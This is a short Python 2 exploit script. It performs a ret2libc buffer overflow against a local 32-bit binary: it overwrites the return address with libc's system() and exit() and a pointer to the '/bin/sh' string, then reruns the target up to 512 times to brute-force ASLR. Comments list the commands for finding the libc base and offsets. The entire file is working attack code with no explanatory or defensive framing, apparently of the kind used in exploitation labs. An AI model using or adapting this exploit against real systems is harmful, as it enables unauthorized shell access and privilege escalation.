import subprocess
import struct


libc_base_addr = 0xb7e19000 #0xb7d0e000 #ldd <binary> |grep libc

system_offset = 0x0003ada0 # readelf -s /lib/i386-linux-gnu/libc.so.6 |grep system
exit_offset = 0x0002e9d0 # readelf -s /lib/i386-linux-gnu/libc.so.6 |grep exit
arg_offset = 0x0015ba0b # strings -a -t x /lib/i386-linux-gnu/libc.so.6 |grep /bin/sh



system_adr = struct.pack("<I",libc_base_addr+system_offset)
exit_adr = struct.pack("<I",libc_base_addr+exit_offset)
arg_adr = struct.pack("<I",libc_base_addr+arg_offset)

buf = "A" * 52 #Find EIP overwrite
buf += system_adr
buf += exit_adr
buf += arg_adr



#ASLR Bruteforce # cat /proc/sys/kernel/randomize_va_space

i = 0
while (i < 512):
 i += 1
 print("Try {0}".format(i))
 ret = subprocess.call(["/home/user/<binary>",buf])
 print ret